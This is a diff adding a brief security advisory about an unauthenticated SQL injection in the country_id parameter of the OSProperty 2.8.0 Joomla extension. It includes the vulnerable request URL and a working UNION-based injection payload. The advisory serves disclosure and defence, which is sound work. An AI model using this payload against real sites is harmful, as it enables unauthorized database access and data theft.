@@ -1,0 +1,31 @@
+OS Solution OSProperty 2.8.0 was vulnerable to an unauthenticated SQL
+injection in the country_id parameter of the request made to retrieve a
+list of states for a given country. The version was not bumped when the
+vulnerability was fixed, but if you download after April 27th, you
+downloaded a fixed version.
+
+http://extensions.joomla.org/extensions/extension/vertical-markets/real-estate/os-property
+
+http://joomdonation.com/joomla-extensions/os-property-joomla-real-estate.html
+
+Example URL:
+
+http://172.31.16.51/index.php?option=com_osproperty&no_html=1&tmpl=component&task=ajax_loadStateInListPage&country_id=31
+
+
+Parameter: country_id (GET)
+
+   Type: UNION query
+
+   Title: MySQL UNION query (NULL) - 2 columns
+
+   Payload:
+option=com_osproperty&no_html=1&tmpl=component&task=ajax_loadStateInListPage&country_id=31'
+UNION ALL SELECT
+NULL,CONCAT(0x716a627171,0x797774584a4b4954714d,0x7162717071)#
+
+
+
+-- 
+http://volatile-minds.blogspot.com -- blog
+http://www.volatileminds.net -- website
